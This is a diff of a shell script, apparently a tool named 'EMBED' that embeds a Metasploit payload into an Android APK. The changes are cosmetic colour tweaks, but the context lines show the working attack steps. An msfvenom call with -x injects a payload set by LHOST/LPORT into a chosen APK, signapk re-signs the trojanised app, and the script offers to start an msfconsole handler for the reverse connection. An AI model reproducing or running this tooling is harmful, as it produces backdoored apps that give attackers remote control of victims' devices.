@@ -52,7 +52,7 @@ function Chao_chao {
 
 function SET {
 	Banner
-printf "$C [IbyC]$W Let's to configure it
+printf "$C [IbyC]$M Let's to configure it$W
 	\n"
 	sleep 2
 
@@ -106,7 +106,7 @@ printf "$C [Set]$G NAMED YOUR .APK$W"
 
 function Msfconsole {
 	echo
-	printf "$C [IbyC]$W Starting msfconsole . . ."
+	printf "$C [IbyC]$M Starting msfconsole . . .$W"
                                 echo "
                                 "
                                         if [ -e $TMP_DIR/.embed/handler.rc ]; then
@@ -166,11 +166,11 @@ printf "$R       [-] Use At Your Own Risk [-]"
 
         "
 Banner
-printf "$C [IbyC]$W Creating payload . . .
+printf "$C [IbyC]$M Creating payload . . .$W
 "
 	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT
 		
-printf "$C [IbyC]$W Signing the .Apk . . ."
+printf "$C [IbyC]$M Signing the .Apk . . .$W"
 	cd $HOME/
 	sleep 3
 	signapk publickey.x509.pem publickey.pk8 $TMP_DIR/unsigned/output.apk $TMP_DIR/finished/$MYAPK
@@ -187,7 +187,7 @@ review=$(find $TMP_DIR/finished/ -name "$MYAPK")
 		\n"
 	fi
 
-printf "$C [IbyC]$W Do you wanna start msfconsole handler?
+printf "$C [IbyC]$M Do you wanna start msfconsole handler?$W
 \n"
 	while read -p " (y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
 		printf "\n $R
@@ -196,7 +196,7 @@ printf "$C [IbyC]$W Do you wanna start msfconsole handler?
 done
                 if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
                         Chao_chao
-			printf "$C [IbyC]$W Do you wanna use the previous configuration ?
+			printf "$C [IbyC]$M Do you wanna use the previous configuration ?$W
 			\n"
 			while read -p " (y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
 				printf "\n $R
@@ -229,7 +229,7 @@ done
 			fi
 
                 else
-			printf "$C [IbyC]$G Thanks to use my EMBED tool
+			printf "$C [IbyC]$G Thanks to use my EMBED tool$W
 			\n"
 			printf "$C [IbyC]$G Have a nice hacking day!!
 		$W \n"
